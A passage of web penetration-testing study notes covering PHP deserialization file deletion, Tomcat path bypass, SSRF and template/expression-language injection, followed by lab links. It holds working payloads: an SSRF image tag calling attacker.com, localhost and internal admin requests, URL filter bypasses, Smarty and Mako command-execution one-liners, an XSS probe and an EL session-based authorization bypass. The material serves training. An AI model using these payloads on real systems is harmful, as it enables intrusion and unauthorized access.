O:<span class="hljs-number">5</span>:<span class="hljs-string">"DoLog"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">15</span>:<span class="hljs-string">"' . "</span>\<span class="hljs-number">0</span><span class="hljs-string">" . 'DoLog' . "</span>\<span class="hljs-number">0</span><span class="hljs-string">" . 'filepath"</span>;s:<span class="hljs-number">16</span>:<span class="hljs-string">"/tmp/history.log"</span>;}
[+] Logfile /tmp/history.<span class="hljs-built_in">log</span> <span class="hljs-keyword">is</span> being removed

[+] Logfile /tmp/history.<span class="hljs-built_in">log</span> <span class="hljs-keyword">is</span> being removed
PHP warning: unlink(/tmp/history.<span class="hljs-built_in">log</span>): No such <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> directory ...
</code></pre>
<p>The program tried to remove the log file twice, once upon the legitimate class instantiation and once upon the deserialization. Let’s now go further and try to delete the arbitrary file. For this purpose, we will create the history.lol file (which has an equal filename length compared to the log file).</p>
<pre><code class="lang-bash">$ touch /tmp/<span class="hljs-keyword">history</span>.<span class="hljs-keyword">lol</span>
</code></pre>
<p>Now, the $serialize variable will be altered, and „history.log” will be replaced with „history.lol”. As the filename length is unchanged, we do not need to change the string length information in the serialized data.</p>
<pre><code class="lang-php">$serialized = <span class="hljs-string">'O:5:"DoLog":1:{s:15:"'</span> . <span class="hljs-string">"\0"</span> . <span class="hljs-string">'DoLog'</span> . <span class="hljs-string">"\0"</span> . <span class="hljs-string">'filepath";s:16:"/tmp/history.lol";}'</span><span class="hljs-comment">;</span>
$o = unserialize($serialized)<span class="hljs-comment">;</span>
</code></pre>
<p>We can observe the destructor function to be run on the history.lol file, which was removed. This way, we were able to manipulate serialized PHP data in order to alter the original behavior of the file.</p>
<pre><code class="lang-bash">$ php a.php
<span class="hljs-string">O:</span><span class="hljs-number">5</span>:<span class="hljs-string">"DoLog"</span>:<span class="hljs-number">1</span>:{<span class="hljs-string">s:</span><span class="hljs-number">15</span>:<span class="hljs-string">"' . "</span>\<span class="hljs-number">0</span><span class="hljs-string">" . 'DoLog' . "</span>\<span class="hljs-number">0</span><span class="hljs-string">" . 'filepath"</span>;<span class="hljs-string">s:</span><span class="hljs-number">16</span>:<span class="hljs-string">"/tmp/history.log"</span>;}
[+] Logfile <span class="hljs-regexp">/tmp/</span>history.lol is being removed

[+] Logfile <span class="hljs-regexp">/tmp/</span>history.log is being removed
</code></pre>
<p>Keep in mind, that serialized data was passed in a variable in order to simplify the example. In the real world, such data often comes from other sources, for example, HTTP request parameters.</p>
<p>Exploitation of such a vulnerability was possible because:</p>
<ul>
<li>We had access to the source code, so we knew what the script exactly does.</li>
<li>We had access to the original serialized payload, so we knew what to alter in it.</li>
<li>The vulnerable function was implemented in the default destructor, so the data was used after the deserialization. There could be a case when data is unserialized but not used in an insecure manner.<h2 id="-other-serialization-"><strong>Other Serialization</strong></h2>
</li>
</ul>
<p>Serialization can be spotted in various places of web applications. In addition, each development language has its own deserialization logic and entry points/transportation mechanisms of serialized data.</p>
<p>Less popular languages will result in harder exploitation of deserialization vulnerabilities, since no automated tools, like ysoserial, will exist.</p>
<p>Also, as the aforementioned examples have indicated, deserialization of untrusted data does not necessarily lead to code execution.</p>
<p>Exploitability of untrusted serialized data might often rely on knowing libraries and functions available on the backend. For this purpose, open-source software is your friend. You might often be able to view the full code of a target application on, e.g., its github repository.</p>
<p>When looking for deserialization vulnerabilities, you should always pay attention to data that:</p>
<ul>
<li>Contain strings that are similar to method names or object names</li>
<li>Contain binary data</li>
<li>Is in a complex, structured form</li>
</ul>
<p>Don’t forget that if the source code of the target software is available, you should inspect it for the presence of serialization-related methods.</p>
<p>Serialization is a language-specific topic; thus, we will not cover serialization in every language separately. Instead, you might want to check some resources on serialization in other languages and technologies in order to get better grasp on that subject.</p>
<p>Exploiting python-based serialization issues is well described in these articles <a href="https://intoli.com/blog/dangerous-pickles/">here</a> and <a href="https://lincolnloop.com/blog/playing-pickle-security/">here</a>.</p>
<p>You can read about .NET viewstate deserialization in these great articles:</p>
<ul>
<li><a href="https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817">https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817</a></li>
<li><a href="https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/">https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/</a></li>
</ul>
<p>Issues related to Ruby insecure deserialization are well described below:</p>
<ul>
<li><a href="https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html">https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html</a></li>
</ul>
<p>Below, there’s also a generic presentation that concerns all mentioned technologies.</p>
<ul>
<li><p><a href="https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf">https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf</a></p>
<h3 id="-labs-"><strong>Labs</strong></h3>
</li>
<li><p><a href="https://portswigger.net/web-security/all-labs#insecure-deserialization">https://portswigger.net/web-security/all-labs#insecure-deserialization</a></p>
</li>
<li><a href="https://github.com/NickstaDB/DeserLab">https://github.com/NickstaDB/DeserLab</a></li>
<li><a href="http://github.com/Yavuzlar/VulnLab">http://github.com/Yavuzlar/VulnLab</a></li>
<li><a href="https://github.com/Sudo-Sakib/Insecure-Deserialization-Lab">https://github.com/Sudo-Sakib/Insecure-Deserialization-Lab</a></li>
<li><a href="https://github.com/Ingenuity-Fainting-Goats/CVE-2017-7525-Jackson-Deserialization-Lab">https://github.com/Ingenuity-Fainting-Goats/CVE-2017-7525-Jackson-Deserialization-Lab</a></li>
</ul>
<hr>
<h1 id="-attacking-the-server-side-"><strong>Attacking the Server-Side</strong></h1>
<h2 id="-server-side-infrastructure-"><strong>Server-Side Infrastructure</strong></h2>
<h3 id="-understanding-modern-infrastructure-"><strong>Understanding Modern Infrastructure</strong></h3>
<p>When interacting with a web application, you should be aware that nowadays, it is unlikely that just one machine handles your connections. Modern web application might consist of an application server, a separate database server (which is secured with a firewall and separated from the outside world), and performance increase mechanisms, like content delivery networks. Often in such a configuration, the IP correlated with the application’s domain name has nothing to do with the real application servers.</p>
<p>Content delivery networks have the purpose of improving an application’s availability via caching and presenting users with a cached version of a website. They are used globally; for example, when trying to view the website from different parts of the globe, users are connected with the cached version that is present on a server that is geographically closest to them.</p>
<p>Another „performance” part of a web application infrastructure is Load Balancers, for example, F5. Load balancers are used to distribute visitors to several servers hosting a copy of the same web applications to improve reliability. Load balancers often utilize the „Host” header to redirect users to proper resources (e.g., virtual hosts). Apart from Load Balancers, there are caching proxies that allow caching of some resources in order to render them each time.</p>
<p>Moreover, devices like a Web Application Firewall or an Intrusion Detection Systems might also be incorporated into an application’s infrastructure. Additionally, proxies and reverse proxies might be in use in order to restrict access to web resources. All these infrastructure elements can be used at once, and all of them reside between the user and the real application server.</p>
<p>![[loadbalancers.jpg]]</p>
<p>When an HTTP request is issued, it passes through all these layers. We will refer to those elements as proxies for simplicity, but keep in mind that these are also load balancers, WAFs, Caching services, etc.</p>
<h3 id="-abusing-intermediate-devices-"><strong>Abusing Intermediate Devices</strong></h3>
<p>Most of these elements are configured to not only pass through but also interpret a user’s requests. They are used to exclude insecure paths or to disallow users from visiting certain resources (e.g.,/manager related pages on Tomcat based web applications).</p>
<p>In 2018, <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">interesting research</a> about handling user-requested resources by web servers was released. One of the discovered bugs was the insecure combination of Tomcat and Nginx reverse proxy.</p>
<p>When Tomcat is combined with a nginx reverse proxy, an insecure condition may occur; this is because Tomcat itself will treat <code>..;/</code> as if it was a parent directory traversal sequence <code>../</code> and normalize (sanitize) that sequence.</p>
<p>However, when relying on the reverse proxy for this task, the proxy might not do that, allowing for escaping “up one directory” because they will pass that path to Tomcat unchanged, and Tomcat will not perform additional validation since it relies on the reverse proxy to do it.</p>
<p>For example, accessing <code>http://tomcatapplication.com/..;/manager/</code> html on a vulnerable setup might reveal the Tomcat Manager.</p>
<p>Due to the false feeling that it is safe from external users, there is a higher likelihood to spot default credentials on such panels.</p>
<h2 id="-server-side-request-forgery-"><strong>Server-Side Request Forgery</strong></h2>
<h3 id="-ssrf-attack-"><strong>SSRF Attack</strong></h3>
<p>Server-Side request forgery is an attack in which the user is able to make the application server (or a proxy or another part of its infrastructure) issue a request for external resources.</p>
<p>The exploitation of SSRF can lead to:</p>
<ul>
<li>Sensitive information disclosure</li>
<li>Stealing authentication information (e.g., Windows NTLM hashes)</li>
<li>File read/inclusion</li>
<li>Remote Code Execution</li>
</ul>
<p>SSRF’s may occur in different places. The most obvious places to look for them are, for example, in „Load profile picture from URL” functionalities or similar features.</p>
<p>The safest way to fetch a remote file by the target website would be to do it using client-side javascript. In such a case, the request is performed by the user’s computer and no application infrastructure takes part in requesting the remote resources.</p>
<h3 id="-when-ssrf-is-a-feature-"><strong>When SSRF is a Feature</strong></h3>
<p>However, websites might have to choose to fetch the resources remotely with a specialized part of the infrastructure, which is dedicated for such kind of tasks. An example might be Facebook, which, upon referencing a remote resource in a private message, uses an internal server to fetch that resource and generate a miniature of it.</p>
<p>Once a URL is entered into Facebook’s message window, its server will perform a request to the remote resources. The user agent is named „facebookexternalhit”, which suggests that this behavior is intended.</p>
<pre><code>Listening <span class="hljs-keyword">on</span> [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">80</span>)
Connection from [<span class="hljs-number">69.171</span>.<span class="hljs-number">251.1</span>] port <span class="hljs-number">80</span> [tcp/http] accepted (family <span class="hljs-number">2</span>, sport <span class="hljs-number">47090</span>)
GET / HTTP/<span class="hljs-number">1.1</span>
Accep<span class="hljs-variable">t:</span> */*
Accept-Encodin<span class="hljs-variable">g:</span> deflate, gzip
User-Agen<span class="hljs-variable">t:</span> facebookexternalhit/<span class="hljs-number">1.1</span> (+http://www.facebook.<span class="hljs-keyword">com</span>/externalhit_uatext.php)
Range: bytes=<span class="hljs-number">0</span>-<span class="hljs-number">524287</span>
Hos<span class="hljs-variable">t:</span> 
Connection: <span class="hljs-keyword">close</span>
</code></pre><p>Since Facebook is actively running a Bug Bounty program, we will not analyze its messaging security as it is constantly being tested by bounty hunters all around the world. However, most of the assets you will test can behave in that way and in most cases, this will not be a „specialized interface” for external connections.</p>
<p>only against „image import” utilities but any mechanisms that rely on fetching remote resources. In web applications, typically it can be:</p>
<ul>
<li>API specification imports (WSDL imports)</li>
<li>Other file imports</li>
<li>Connection to remote servers (e.g., FTP)</li>
<li>„ping” or „alivecheck” utilities</li>
<li>Any parts of an http request that include URLs<h3 id="-blind-ssrf-exploitation-"><strong>Blind SSRF Exploitation</strong></h3>
</li>
</ul>
<p>SSRF’s can also exist in „blind” form; for example, in document generators. If one is able to inject content into an online PDF generator, inserting something like the code below might likely lead to receiving a GET request from the parser server. It is because the server-side content parser will try to evaluate the content before rendering the PDF.</p>
<pre><code class="lang-html">&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"http://attacker.com:80/ssrf"</span>&gt;
</code></pre>
<p>It will then parse the IMG tag and try to fetch the remote picture without knowing that it does not exist.</p>
<p>If a SSRF is received from a remote parser, it is worth inspecting the full request content (e.g., with a netcat listener) as it may contain interesting headers (including session IDs or technical information).</p>
<p>Another place where SSRF payloads can be inserted is HTTP request headers. You can, for example, place your domain in any HTTP header and look for HTTP or DNS resolution.</p>
<p>Burp intruder might be helpful in that task; for example, you can feed it with a list of <a href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">all HTTP headers</a> and assign your domain to each of them. It is possible that some of the intermediate proxies might try to resolve these domains.</p>
<p>As you now know where to look for the SSRF vulnerabilities, it’s time to show you the potential impact of them. An SSRF vulnerability’s impact relies heavily on the creativity and skills of the penetration tester, as performing an arbitrary request revealing the internal IP is rarely a severe vulnerability itself.</p>
<h4 id="-abusing-url-structure-"><strong>Abusing URL Structure</strong></h4>
<p>As SSRF is about handling URL’s, let’s recall how the URL is built:</p>
<p>![[url.png]]</p>
<h3 id="-common-ssrf-attacks-"><strong>Common SSRF attacks</strong></h3>
<p>SSRF attacks often exploit trust relationships to escalate an attack from the vulnerable application and perform unauthorized actions. These trust relationships might exist in relation to the server, or in relation to other back-end systems within the same organization.</p>
<h4 id="-ssrf-attacks-against-the-server-"><strong>SSRF attacks against the server</strong></h4>
<p>In an SSRF attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like <code>127.0.0.1</code> (a reserved IP address that points to the loopback adapter) or <code>localhost</code> (a commonly used name for the same adapter).</p>
<p>For example, imagine a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs. It does this by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. When a user views the stock status for an item, their browser makes the following request:</p>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/product/stock</span> HTTP/1.0
<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span>: 118 

<span class="apache"><span class="hljs-attribute">stockApi</span>=http://stock.weliketoshop.net:8080/product/stock/check<span class="hljs-number">%3</span>FproductId<span class="hljs-number">%3</span>D6<span class="hljs-number">%26</span>storeId<span class="hljs-number">%3</span>D1</span>
</code></pre><p>This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.</p>
<p>In this example, an attacker can modify the request to specify a URL local to the server:</p>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/product/stock</span> HTTP/1.0
<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span>: 118

<span class="groovy">stockApi=<span class="hljs-string">http:</span><span class="hljs-comment">//localhost/admin</span></span>
</code></pre><p>The server fetches the contents of the <code>/admin</code> URL and returns it to the user.</p>
<p>An attacker can visit the <code>/admin</code> URL, but the administrative functionality is normally only accessible to authenticated users. This means an attacker won&#39;t see anything of interest. However, if the request to the <code>/admin</code> URL comes from the local machine, the normal access controls are bypassed. The application grants full access to the administrative functionality, because the request appears to originate from a trusted location.</p>
<p>Why do applications behave in this way, and implicitly trust requests that come from the local machine? This can arise for various reasons:</p>
<ul>
<li>The access control check might be implemented in a different component that sits in front of the application server. When a connection is made back to the server, the check is bypassed.</li>
<li>For disaster recovery purposes, the application might allow administrative access without logging in, to any user coming from the local machine. This provides a way for an administrator to recover the system if they lose their credentials. This assumes that only a fully trusted user would come directly from the server.</li>
<li>The administrative interface might listen on a different port number to the main application, and might not be reachable directly by users.</li>
</ul>
<p>These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, often make SSRF into a critical vulnerability.</p>
<h4 id="-ssrf-attacks-against-other-back-end-systems-"><strong>SSRF attacks against other back-end systems</strong></h4>
<p>In some cases, the application server is able to interact with back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses. The back-end systems are normally protected by the network topology, so they often have a weaker security posture. In many cases, internal back-end systems contain sensitive functionality that can be accessed without authentication by anyone who is able to interact with the systems.</p>
<p>In the previous example, imagine there is an administrative interface at the back-end URL <code>https://192.168.0.68/admin</code>. An attacker can submit the following request to exploit the SSRF vulnerability, and access the administrative interface:</p>
<pre><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/product/stock</span> HTTP/1.0
<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
<span class="hljs-attribute">Content-Length</span>: 118

<span class="groovy">stockApi=<span class="hljs-string">http:</span><span class="hljs-comment">//192.168.0.68/admin</span></span>
</code></pre><h4 id="-ssrf-with-blacklist-based-input-filters-"><strong>SSRF with blacklist-based input filters</strong></h4>
<p>Some applications block input containing hostnames like <code>127.0.0.1</code> and <code>localhost</code>, or sensitive URLs like <code>/admin</code>. In this situation, you can often circumvent the filter using the following techniques:</p>
<ul>
<li>Use an alternative IP representation of <code>127.0.0.1</code>, such as <code>2130706433</code>, <code>017700000001</code>, or <code>127.1</code>.</li>
<li>Register your own domain name that resolves to <code>127.0.0.1</code>. You can use <code>spoofed.burpcollaborator.net</code> for this purpose.</li>
<li>Obfuscate blocked strings using URL encoding or case variation.</li>
<li>Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an <code>http:</code> to <code>https:</code> URL during the redirect has been shown to bypass some anti-SSRF filters.<h4 id="-ssrf-with-whitelist-based-input-filters-"><strong>SSRF with whitelist-based input filters</strong></h4>
</li>
</ul>
<p>Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.</p>
<p>The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:</p>
<ul>
<li>You can embed credentials in a URL before the hostname, using the <code>@</code> character. For example: <code>https://expected-host:fakepassword@evil-host</code></li>
<li>You can use the <code>#</code> character to indicate a URL fragment. For example: <code>https://evil-host#expected-host</code></li>
<li>You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: <code>https://expected-host.evil-host</code></li>
<li>You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try <a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding">double-encoding</a> characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.</li>
<li>You can use combinations of these techniques together.<h2 id="-language-evaluation-"><strong>Language Evaluation</strong></h2>
<h3 id="-language-evaluation-issues-"><strong>Language Evaluation Issues</strong></h3>
</li>
</ul>
<p>Language evaluation is a generic name we chose for vulnerabilities that include:</p>
<ul>
<li>Double evaluation</li>
<li>Server-Side Template Injections</li>
<li>Expression language injections</li>
</ul>
<p>All of them are caused by a user’s ability to force the target application server to execute arbitrary programmistic code. That code is, however, not in plain form, and it is always in the form of an Expression. These vulnerabilities were grouped together because of the similarity between them in terms of both detection and exploitation. Their root cause might be a bit different though.</p>
<h3 id="-template-engines-"><strong>Template Engines</strong></h3>
<p>Some web applications use template systems to enable dynamic content generation into their pages, similar to the previously mentioned server-side includes. Consider the following pseudo code:</p>
<pre><code class="lang-php"><span class="hljs-variable">$template</span>-&gt;render(<span class="hljs-string">"Hello <span class="hljs-variable">${user_name}</span> !"</span>)
</code></pre>
<p>The expression between <code>${}</code> is the Template Expression, which holds the <code>user_name</code> variable. We do not know the origin of <code>user_name</code>; presumably it’s generated server-side - e.g., during login. Using the template engine, it is possible to dynamically print that user name on the login page.</p>
<p>Now consider the following vulnerable pseudo-code:</p>
<pre><code class="lang-php"><span class="hljs-variable">$template</span>-&gt;render(<span class="hljs-string">"Hello <span class="hljs-variable">$_GET</span>['user_name'] !"</span>)
</code></pre>
<p>In such a case, the user could be able to inject the template expression independently. We now control what will be evaluated and most likely, user_name is the last thing of interest.</p>
<p>Such issues are also called double-evaluation since the programmistic code is being evaluated twice.</p>
<p>Most popular languages which use templates in web development technologies are:</p>
<ul>
<li>PHP (Twig, Smarty)</li>
<li>Python (Flask, Jinja)</li>
<li>Java (Freemarker)</li>
</ul>
<p>Such kind of vulnerabilities is not only limited to template engines. In Java applications, some technologies have a similar purpose of generating dynamic content, for example:</p>
<ul>
<li>OGNL (Object-Graph Navigation Language) - frequently used in Apache Struts RCE exploits</li>
<li>EL (Expression Language) – generic dynamic expression set for java applications<h3 id="-detecting-template-injection-"><strong>Detecting Template Injection</strong></h3>
</li>
</ul>
<p>Server-side evaluation of client-supplied expressions often leads to critical vulnerabilities, including Remote Code Execution. This type of vulnerabilities is, however, tricky in both detection and exploitation.</p>
<p>A generic technique for the detection of template / expression language injection is to inject multiple template tags into the web application and observe if they were transformed in some way in the response.</p>
<p>Keep in mind, that often the injected data might be reflected indirectly, for instance, on a different page than it was injected (e.g., invalid login names might be reflected in admin-only accessible logs).</p>
<p>You can follow a similar approach when looking for template / expression language injections to the one you use when testing an application for stored XSS vulnerabilities - injecting a payload and looking for occurrences of it within the application.</p>
<p>Most template expressions are similar to each other; they are all in curly braces like the below examples (but not limited to):</p>
<ul>
<li>{{expr}}</li>
<li>${expr}</li>
<li>%{expr}</li>
<li>#{expr}</li>
<li>%25{expr}</li>
<li>{expr}<h3 id="-confirming-template-injection-"><strong>Confirming Template Injection</strong></h3>
</li>
</ul>
<p>The best expressions to inject are simple mathematical equations like <code>${5*11111}</code>, for instance. In such a case, you would look for the value <strong>55555</strong> in the response of your request. Finding it is a positive sign that server-side evaluation possibly occured. However, further confirmation is required to be sure that the code is executed on the server-side and has access to sensitive data.</p>
<p>If you are a user of Burp Suite Pro, you should get an extension named J2EE Scan which automatically adds tests for expression language injection. If you are using Burp Community or want to have your customized tool to detect such vulnerabilities, you can build your own list of payloads based on the previous slides.</p>
<p>Then, you can look for evaluated numbers (like 55555 or other custom, easily identified values) in page responses. Another good idea could be to use Burp Intruder to test several payloads of that type, as it is likely that while, for example, <code>#{5*11111}</code> will work, <code>%{5*11111}</code> may not.</p>
<p>You can also use the following diagram to help you with profiling this type of vulnerability, whether it is a template or expression language injection.</p>
<p>![[template-decision-tree.png]]</p>
<p>Further exploitation beyond forcing the application to perform mathematical calculations (which is not really a severe issue) relies heavily on the technology we are dealing with in each case.</p>
<p>Thus, the first step after observing anomalies related to calculations or unusual handling of expressions in curly braces should be trying to identify the underlying technology.</p>
<p>To better identify the technology, you can first:</p>
<ul>
<li>Observe which is the generic technology of the application. If it is java (e.g., you see it uses .jsp extensions), then you can suspect it is an expression language / OGNL.</li>
<li>Use the diagram from slide 79 as it contains popular behavior of template engines when handling expressions.</li>
<li>Try to inject unclosed curly braces (be careful as there is a chance you might permanently disable the attacked webpage); this might provoke verbose error disclosing the underlying technology.</li>
<li>Observe other verbose errors for technology names.</li>
</ul>
<p>The last possibility of confirming an injection is to use expressions typical of a certain language. It might often require working with their documentation in order to reference interesting variables or call insecure methods.</p>
<h3 id="-exploiting-template-injection-"><strong>Exploiting Template Injection</strong></h3>
<p>For example, if you are dealing with the PHP template engine called Smarty, the RCE payload can be as simple as the one-liner below:</p>
<pre><code class="lang-php"><span class="xml"></span><span class="hljs-template-variable">{php}</span><span class="xml">echo 'id';</span><span class="hljs-template-tag">{/<span class="hljs-name">php</span>}</span><span class="xml"></span>
</code></pre>
<p>The Python engine Mako is also very straightforward, as we see below:</p>
<pre><code class="lang-python">&lt;% <span class="hljs-keyword">import</span> os x=os.popen('id').read() %&gt; 
${x}
</code></pre>
<p>Apart from the aforementioned template injection vulnerability (of unknown impact) you can also observe an XSS vulnerability if you type in, for example:</p>
<pre><code>{{&lt;svg/onload=confirm(<span class="hljs-number">1</span>)}}
</code></pre><p>Trying to brute force object names could be an additional step; for example, Twig utilizes a known object named <code>{{_self}}</code> (which is a reference to the current application instance).</p>
<p>One of Twig’s <code>_self</code>’s attributes is named <code>env</code> and contains other methods that can be called.</p>
<p>Since every template engine has its own functions and methods (and some of them are sandboxed as well), exploiting template injections is dependent on reading the source code and documentation. You can find many object names and methods there.</p>
<p>When identifying expression language / OGNL injection, the steps are a bit different.</p>
<p>First, Java applications are easily recognizable as they tend to:</p>
<ul>
<li>Use common extensions like <code>.jsp</code> or <code>.jsf</code></li>
<li>Throw stack traces on errors</li>
<li>Use known terms in headers like „Servlet”</li>
</ul>
<p>When confirming the EL/OGNL injection in Java, we must receive the calculation output first – like <code>${5*5}</code>, which will be evaluated as 25. As a reminder, <code>${5*5}</code> is not the only expression of interest but also:</p>
<ul>
<li><code>{5*5}</code></li>
<li><code>${5*5}</code></li>
<li><code>#{5*5}</code></li>
<li><code>%{5*5}</code></li>
<li><code>%25{5*5}</code></li>
</ul>
<p>Of course, the numbers to be calculated can be anything.</p>
<h4 id="-playing-with-classes-"><strong>Playing with Classes</strong></h4>
<p>In order to make use of different java classes other than string, we will use Reflection. For simplicity, Reflection is java’s mechanism that allows us to invoke methods without initially knowing their names. Moreover, it services well in situations where we cannot write plain code. Consider the following input:</p>
<pre><code class="lang-java">{<span class="hljs-string">"x"</span>.getClass()}
</code></pre>
<pre><code class="lang-java">[class java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>]
</code></pre>
<p>The expression parser returns an object of type <code>java.langString</code>, but you can subvert the object type using <code>forName()</code>:</p>
<pre><code class="lang-java">{<span class="hljs-string">""</span>.getClass().forName(<span class="hljs-string">"java.util.Date"</span>)}
</code></pre>
<pre><code class="lang-java">[class java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Data</span>]
</code></pre>
<p>We can use reflection to finally enumerate the object’s methods. In the end, they can be displayed using <code>toString()</code>:</p>
<pre><code class="lang-java">{<span class="hljs-string">""</span>.getClass().forName(<span class="hljs-string">"java.util.Date"</span>).getMethods()[<span class="hljs-number">0</span>].toS tring()}
</code></pre>
<pre><code class="lang-java">[public boolean java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Date</span><span class="hljs-selector-class">.before</span>(java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Data</span>)]
</code></pre>
<h4 id="-el-code-execution-"><strong>EL Code Execution</strong></h4>
<p>Let’s now try to achieve Remote Code Execution. There are two commonly-used utilities in Java that allow OS command execution access.</p>
<pre><code class="lang-java">Java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.getRuntime</span>().exec(<span class="hljs-string">"command"</span>)
</code></pre>
<p>AND</p>
<pre><code class="lang-java"><span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ProcessBuilder</span>(<span class="hljs-selector-tag">command</span>, <span class="hljs-selector-tag">argument1</span>, <span class="hljs-selector-tag">argument2</span>)<span class="hljs-selector-class">.start</span>()
</code></pre>
<p>We will go with the Runtime way. First, we check the existence of the <code>getRuntime()</code> method:</p>
<pre><code class="lang-java">{<span class="hljs-string">""</span>.getClass().forName(<span class="hljs-string">"java.lang.Runtime"</span>).getMethods()[<span class="hljs-number">6</span>].toString()}
</code></pre>
<pre><code class="lang-java">[public static java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span> java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.getRuntime</span>()]
</code></pre>
<h4 id="-extending-el-exploitation-"><strong>Extending EL Exploitation</strong></h4>
<p>On web application environments, you can also try to enumerate server variables using the Expression Language Injection. Moreover, it might be possible to amend them resulting in, for example, authorization bypasses.</p>
<p>Server variables usually have universal names – like <code>${application}</code>, <code>${session}</code>, <code>${request}</code>. Burp Intruder can be utilized for injecting these and looking if interesting data is not returned in result (if the object is resolved).</p>
<p>Below we can see what some sample variable names can look like (they are all placed in their respective template curly braces):</p>
<ul>
<li>applicationScope – global application variables</li>
<li>requestScope – request variables</li>
<li>initParam – application initialization variables</li>
<li>sessionScope – session variables</li>
<li>param.X – parameter value where X is name of a http parameter</li>
</ul>
<p>Of course retrieving values of these parameters can be possible after casting them to string. So, exemplary extraction of sessionScope might look like the following: <code>${sessionScope.toString()}</code></p>
<p>Sample authorization bypass might be similar to the below statement: <code>${pageContext.request.getSession().setAttribute(&quot;admin&quot;, true)}</code></p>
<p>Keep in mind that the application might utilize custom variables. That’s why using the Burp Intruder wordlist is suggested (even the filename list might do). It is possible to find variables named:</p>
<ul>
<li><code>${user}</code></li>
<li><code>${password}</code></li>
<li><code>${employee.FirstName}</code></li>
</ul>
<p>Similarly to Template Injections, Expression Language injections might also require working with documentation. Often, some characters might be disallowed, or the expression length might be limited. Also, depending on the Expression Language version, some features might be on or off.</p>
<p>Recommended reading:</p>
<ul>
<li><a href="https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/">https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/</a></li>
<li><a href="https://sethjackson.github.io/2018/04/16/el-injection/">https://sethjackson.github.io/2018/04/16/el-injection/</a></li>
<li><a href="https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/">https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/</a><h2 id="-labs-"><strong>Labs</strong></h2>
<h4 id="-ssrf-"><strong>SSRF</strong></h4>
</li>
<li><a href="https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf">https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf</a></li>
<li><a href="https://github.com/BenjiTrapp/ssrf-playground">https://github.com/BenjiTrapp/ssrf-playground</a></li>
<li><a href="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab">https://github.com/incredibleindishell/SSRF_Vulnerable_Lab</a></li>
<li><a href="https://tryhackme.com/room/ssrfhr">https://tryhackme.com/room/ssrfhr</a></li>
<li><a href="https://github.com/Captain-K-101/Ssrf-labs">https://github.com/Captain-K-101/Ssrf-labs</a><h4 id="-ssti-"><strong>SSTI</strong></h4>
</li>
<li><a href="https://portswigger.net/web-security/all-labs#server-side-template-injection">https://portswigger.net/web-security/all-labs#server-side-template-injection</a></li>
<li><a href="http://github.com/Yavuzlar/VulnLab">http://github.com/Yavuzlar/VulnLab</a></li>
<li><a href="https://github.com/CandyCaneCapone/SSTI-Playground">https://github.com/CandyCaneCapone/SSTI-Playground</a></li>
<li><a href="https://github.com/filipkarc/ssti-flask-hacking-playground">https://github.com/filipkarc/ssti-flask-hacking-playground</a></li>
<li><a href="https://github.com/dr34mhacks/Ginger-juice-shop">https://github.com/dr34mhacks/Ginger-juice-shop</a></li>
</ul>
<hr>
